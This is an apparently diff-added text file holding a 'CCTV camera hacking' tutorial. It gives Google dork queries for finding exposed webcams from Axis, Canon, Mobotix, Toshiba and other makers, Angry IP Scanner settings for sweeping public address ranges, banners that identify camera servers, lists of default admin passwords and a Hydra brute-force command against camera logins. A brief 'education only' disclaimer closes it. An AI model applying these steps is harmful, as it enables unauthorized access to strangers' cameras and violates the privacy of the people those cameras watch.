@@ -1,0 +1,105 @@
+Axis Webcams: 
+inurl:/view.shtml
+inurl:view/index.shtml
+inurl:/view/view.shtml axis 
+"my webcamXP server!" 
+intitle:"Live View / - AXIS" 
+inurl:view/view.shtml 
+inurl:indexFrame.html axis 
+
+Cannon Webcams: 
+inurl:sample/LvAppl/
+
+MOBOTIX Webcams: 
+inurl:control/userimage.html 
+
+FlexWatch Webcams: 
+inurl:/app/idxas.html
+
+JVC Webcams: 
+intitle:tV.Networks [Motion Picture(Java)]
+inurl:app/idxas.html 
+
+"V.Networks [Motion Picture(Java)" 
+"TOSHIBA Network Camera - User Login" 
+inurl:ViewerFrame?Mode=Motion 
+inurl:sample/LvAppl/ 
+inurl:home/homeJ.html
+
+Step 1Download Angry Ip Scanner
+Angry Ip scanner is powerful GUI Port scanner . Angry Ip scanner available for all major OS.
+
+Download and Install Angry ip scanner
+
+Step 2Choose Ip Address Range
+Its important that how to choose proper ip address range for CCTV camera hacking. CCTV cameras are connected with broadband internet connection. If your accessing broadband router then find your public ip address. Just type 'My IP' in Google or Bing search bar. Google will show your public ip address
+
+Here 77.247.181.165 is my public ip . So ip range can be 77.247.181.1 o 77.247.181.255 or 77.247.181.1 o 77.247.185.255
+
+Step 3Configure Angry Ip for CCTV Camera Hacking
+Open Angry Ip Scanner
+
+Go to tools > Preferences > Ports | add ports 80,8080,23 in Port selection tab
+It will scan 80,8080 and 23 port.
+
+We need add web detect. Web detect can show short details about device details connected to internet. like as follow
+
+CCTV camera model name
+CCTV camera name
+router name or router model name
+Add web detect as follows
+
+Go to Tools > Fetchers > add (<<) web detect
+
+Click OK
+
+Step 4Start Ip Range Scanning
+Add ip range in Ip range tab and click start
+After scanning finished you will find interesting information in web detect tab some examples as follows
+
+RomPager/4.07 UPnP/1.0 ----- router
+uc-httpd 1.0.0 ----- CCTV camera
+DVRDVS-Webs ----- CCTV camera
+microhttpd ----- router
+Webs ----- CCTV camera
+Hikvision-Webs ----- CCTV camera
+iBall-Baton ----- CCTV camera
+Copy ip address of detected CCTV camera and pest in browser press enter.
+
+Step 5
+Default Username and Password
+Most of the CCTV cameras and router configured default username and password. example
+
+Username : admin | password : admin
+Username : admin | password : (blank password)
+Username : admin | password : 12345
+Username : admin | password : 9999
+
+You can find default username and password list trying some googling
+
+some CCTV cameras need plugin, you can download from same page. If not found plugin at same page then go to manufacture website site and download it.
+
+Step 6Crack CCTV Camera Password Using Hydra
+If default password not work then we need to crack it. hydra is powerful brute for tool can crack CCTV cameras password.
+
+Now fire up kali
+root@DeepHack:~# hydra -s 80 -l admin -P /root/Desktop/wl/cctvpass.txt -e ns -t 16 targetIP http*
+
+
+Hydra syntax
+
+-s 80 -- define port number
+-l admin -- default login name admin
+-P /root/desktop/worldlist.txt -- choose your word list for brute force
+-e --- empty password
+ns --- try login as password and try empty password
+http --- port name for attack
+
+Using these can hack CCTV cameras
+
+Step 7
+Warnning
+This article is only for education purpose . Aim of these article is that how can secure cctv cameras using strong passwords. Do not use for criminal or another black art purpose. I am not responsible for that.
+
+http://www.insecam.org
+
